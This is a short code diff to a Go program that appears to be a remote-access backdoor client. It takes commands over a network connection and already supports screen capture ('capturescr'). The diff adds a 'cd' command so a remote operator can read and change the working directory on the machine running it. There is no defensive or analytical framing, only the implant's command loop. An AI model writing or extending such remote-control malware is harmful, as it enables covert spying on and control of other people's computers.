@@ -31,6 +31,23 @@ func main() {
 			send_msg(conn, "Connection closing :|")
 			conn.Close()
 			os.Exit(0)
+		} else if cmd[0:2] == "cd" {
+			if cmd == "cd" {
+				result, err := os.Getwd()
+				if err != nil {
+					send_msg(conn, err.Error())
+				} else {
+					send_msg(conn, result)
+				}
+			} else {
+				tgt_dir := strings.Split(cmd, " ")[1]
+				if err := os.Chdir(tgt_dir); err != nil {
+					send_msg(conn, err.Error())
+				} else {
+					cur_wd, _ := os.Getwd()
+					send_msg(conn, fmt.Sprintf("Dir changed successfully to %s", cur_wd))
+				}
+			}
 		} else if cmd == "capturescr" {
 			result := capture_scr()
 			send_msg(conn, result)
